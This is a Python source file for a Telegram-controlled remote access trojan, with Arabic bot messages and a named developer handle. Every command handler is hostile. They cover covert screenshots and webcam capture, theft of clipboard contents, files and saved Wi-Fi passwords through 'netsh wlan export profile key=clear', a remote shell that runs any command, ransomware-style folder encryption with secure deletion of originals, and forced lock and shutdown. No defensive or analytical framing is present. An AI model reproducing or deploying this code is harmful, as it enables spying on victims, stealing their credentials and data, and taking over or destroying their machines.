import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
import xml.etree.ElementTree as ET
from secure_delete import secure_delete

TOKEN = str(input("Enter your bot token: "))

bot = telebot.TeleBot(TOKEN)
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()
bot.set_webhook()


@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(
        message.chat.id,
        """
        اهلا بك! ارسل /screen لأخذ سكرين شوت للشاشة.\n/sys لأخذ معلومات النضام.\n/ip لأخذ الايبي.\n/cd للتنقل بين الفولدرات. \n/ls لعرض الفولدرات. \n/upload [المسار] لرفع . /decrypt [المسار] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown  
        المطور : @S_J_O_D 🤍 ... !
        """,
    )


@bot.message_handler(commands=["screen"])
def send_screen(message):
    with mss.mss() as sct:
        sct.shot(output=f"{cd}\capture.png")

    image_path = f"{cd}\capture.png"
    print(image_path)
    with open(image_path, "rb") as photo:
        bot.send_photo(message.chat.id, photo)


@bot.message_handler(commands=["ip"])
def send_ip_info(message):
    try:
        command_ip = "curl ipinfo.io/ip"
        result = subprocess.check_output(command_ip, shell=True)
        public_ip = result.decode("utf-8").strip()
        bot.send_message(message.chat.id, public_ip)
    except:
        bot.send_message(message.chat.id, "error")


@bot.message_handler(commands=["sys"])
def send_system_info(message):
    system_info = {
        "Platform": platform.platform(),
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU Cores": os.cpu_count(),
        "Username": os.getlogin(),
    }
    system_info_text = "\n".join(
        f"{key}: {value}" for key, value in system_info.items()
    )
    bot.send_message(message.chat.id, system_info_text)


@bot.message_handler(commands=["ls"])
def list_directory(message):
    try:
        contents = os.listdir(cd)
        if not contents:
            bot.send_message(message.chat.id, "folder is empty.")
        else:
            response = "Directory content :\n"
            for item in contents:
                response += f"- {item}\n"
            bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=["cd"])
def change_directory(message):
    try:
        global cd
        args = message.text.split(" ")
        if len(args) >= 2:
            new_directory = args[1]
            new_path = os.path.join(cd, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                cd = new_path
                bot.send_message(message.chat.id, f"you are in : {cd}")
            else:
                bot.send_message(message.chat.id, f"The directory does not exist.")
        else:
            bot.send_message(
                message.chat.id, "لم تستخدم الأمر بصورة صحيحة. : استخدم  /cd [اسم الملف]"
            )
    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ : {str(e)}")


@bot.message_handler(commands=["upload"])
def handle_upload_command(message):
    try:
        args = message.text.split(" ")
        if len(args) >= 2:
            file_path = args[1]

            if os.path.exists(file_path):

                with open(file_path, "rb") as file:

                    bot.send_document(message.chat.id, file)

                bot.send_message(
                    message.chat.id, f"تم رفع الملف بنجاح."
                )
            else:
                bot.send_message(message.chat.id, "المسار غير موجود.")
        else:
            bot.send_message(
                message.chat.id, "امر غير صحيح. استخدم : /upload [المسار]"
            )
    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ : {str(e)}")


@bot.message_handler(commands=["crypt"])
def encrypt_folder(message):
    try:

        if len(message.text.split()) >= 2:
            folder_to_encrypt = message.text.split()[1]
            password = "Your_fucking_strong_password"

            for root, dirs, files in os.walk(folder_to_encrypt):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file_path = file_path + ".crypt"

                    pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)

                    if not file_path.endswith(".crypt"):

                        secure_delete.secure_delete(file_path)

            bot.send_message(
                message.chat.id,
                "تم تشفير المجلد، وتم حذف الملفات الأصلية غير المشفرة بشكل آمن بنجاح.",
            )
        else:
            bot.send_message(
                message.chat.id, "امر غير صحيح. استخدم : /crypt [مسار الملف]"
            )
    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ : {str(e)}")


@bot.message_handler(commands=["decrypt"])
def decrypt_folder(message):
    try:

        if len(message.text.split()) >= 2:
            folder_to_decrypt = message.text.split()[1]
            password = "Your_fucking_strong_password"

            for root, dirs, files in os.walk(folder_to_decrypt):
                for file in files:
                    if file.endswith(".crypt"):
                        file_path = os.path.join(root, file)
                        decrypted_file_path = file_path[:-6]

                        pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)

                        secure_delete.secure_delete(file_path)

            bot.send_message(
                message.chat.id,
                "تم بنجاح عزيزي ..",
            )
        else:
            bot.send_message(
                message.chat.id,
                "امر غير صحيح. استخدم : /decrypt [المسار]",
            )
    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ : {str(e)}")


@bot.message_handler(commands=["lock"])
def lock_command(message):
    try:

        result = subprocess.run(
            ["rundll32.exe", "user32.dll,LockWorkStation"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        if result.returncode == 0:
            bot.send_message(message.chat.id, "تم قفل الجهاز بنجاح.")
        else:
            bot.send_message(message.chat.id, "لا يمكن قفل الشاشة.")
    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ : {str(e)}")


shutdown_commands = [
    ["shutdown", "/s", "/t", "5"],
    ["shutdown", "-s", "-t", "5"],
    ["shutdown.exe", "/s", "/t", "5"],
    ["shutdown.exe", "-s", "-t", "5"],
]


@bot.message_handler(commands=["shutdown"])
def shutdown_command(message):
    try:
        success = False
        for cmd in shutdown_commands:
            result = subprocess.run(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            if result.returncode == 0:
                success = True
                break

        if success:
            bot.send_message(message.chat.id, "سوف يتم الايقاف خلال خمس ثواني.")
        else:
            bot.send_message(message.chat.id, "لا يمكن الأطفاء.")
    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ : {str(e)}")


@bot.message_handler(commands=["webcam"])
def capture_webcam_image(message):
    try:

        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            bot.send_message(message.chat.id, "حدث خطأ في اخذ الصورة.")
        else:

            ret, frame = cap.read()

            if ret:

                cv2.imwrite("webcam.jpg", frame)

                with open("webcam.jpg", "rb") as photo_file:
                    bot.send_photo(message.chat.id, photo=photo_file)

                os.remove("webcam.jpg")
            else:
                bot.send_message(message.chat.id, "حدث خطأ في اخذ الصورة.")

        cap.release()

    except Exception as e:
        bot.send_message(message.chat.id, f"هنالك خطأ: {str(e)}")


@bot.message_handler(commands=["speech"])
def text_to_speech_command(message):
    try:

        text = message.text.replace("/speech", "").strip()

        if text:

            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "تم بنجاح التحدث.")
        else:
            bot.send_message(message.chat.id, "استخدم الأمر هكذا /speech [نص]")
    except Exception as e:
        bot.send_message(message.chat.id, f"هنالك خطأ : {str(e)}")


@bot.message_handler(commands=["clipboard"])
def clipboard_command(message):
    try:

        clipboard_text = clipboard.paste()

        if clipboard_text:

            bot.send_message(message.chat.id, f"محتوى الحافضة :\n{clipboard_text}")
        else:
            bot.send_message(message.chat.id, "الحافضة فارغة.")
    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ : {str(e)}")


user_states = {}


STATE_NORMAL = 1
STATE_SHELL = 2


@bot.message_handler(commands=["shell"])
def start_shell(message):
    user_id = message.from_user.id
    user_states[user_id] = STATE_SHELL
    bot.send_message(
        user_id, "انت الأن في التيرمنل. اكتب 'exit' للخروج من التيرمنل."
    )


@bot.message_handler(
    func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL
)
def handle_shell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == "exit":
        bot.send_message(user_id, "جاري الخروج من التيرمنل.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = process.communicate()

            if stdout:
                output = stdout.decode("utf-8", errors="ignore")
                bot.send_message(user_id, f"ناتج الأمر :\n{output}")
            if stderr:
                error_output = stderr.decode("utf-8", errors="ignore")
                bot.send_message(user_id, f"خطأ في الأمر:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"حدث خطأ: {str(e)}")


def get_user_state(user_id):
    return user_states.get(user_id, STATE_NORMAL)


@bot.message_handler(
    func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL
)
def handle_shell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == "exit":
        bot.send_message(user_id, "جاري الخروج من التيرمنل.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = process.communicate()

            if stdout:
                output = stdout.decode("utf-8", errors="ignore")
                send_long_message(user_id, f"الأمر الناتج:\n{output}")
            if stderr:
                error_output = stderr.decode("utf-8", errors="ignore")
                send_long_message(user_id, f"خطأ في الأمر:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"حدث خطأ: {str(e)}")


def send_long_message(user_id, message_text):
    part_size = 4000
    message_parts = [
        message_text[i : i + part_size] for i in range(0, len(message_text), part_size)
    ]

    for part in message_parts:
        bot.send_message(user_id, part)


@bot.message_handler(commands=["wifi"])
def get_wifi_passwords(message):
    try:

        subprocess.run(
            ["netsh", "wlan", "export", "profile", "key=clear"], shell=True, text=True
        )

        with open("Wi-Fi-App.xml", "r") as file:
            xml_content = file.read()

        ssid_match = re.search(r"<name>(.*?)<\/name>", xml_content)
        password_match = re.search(r"<keyMaterial>(.*?)<\/keyMaterial>", xml_content)

        if ssid_match and password_match:
            ssid = ssid_match.group(1)
            password = password_match.group(1)

            message_text = f"SSID: {ssid}\nPASS: {password}"
            bot.send_message(message.chat.id, message_text)
            try:
                os.remove("Wi-Fi-App.xml")
            except:
                pass
        else:
            bot.send_message(message.chat.id, "لم يتم العثور على اي شيء.")

    except Exception as e:
        bot.send_message(message.chat.id, f"حدث خطأ : {str(e)}")


try:
    if __name__ == "__main__":
        print("انتضار امر...")
        try:
            bot.infinity_polling()
        except:
            time.sleep(10)
            pass

except:
    time.sleep(5)
    pass
